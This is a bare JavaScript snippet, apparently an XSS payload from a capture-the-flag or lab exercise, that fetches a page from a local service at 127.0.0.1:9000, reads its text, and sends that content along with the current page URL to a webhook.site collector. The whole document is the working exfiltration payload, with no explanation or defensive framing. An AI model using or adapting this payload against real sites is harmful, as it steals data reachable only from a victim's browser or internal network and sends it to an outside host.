fetch("http://127.0.0.1:9000/view/fe20f57d-b9b2-4574-a471-b8587155c593")
  .then(r => {return r.text()})
  .then((d) => {fetch(" https://webhook.site/42588426-a448-4543-8951-8a3182af820d?data="+d+"&domain="+window.location.href)})
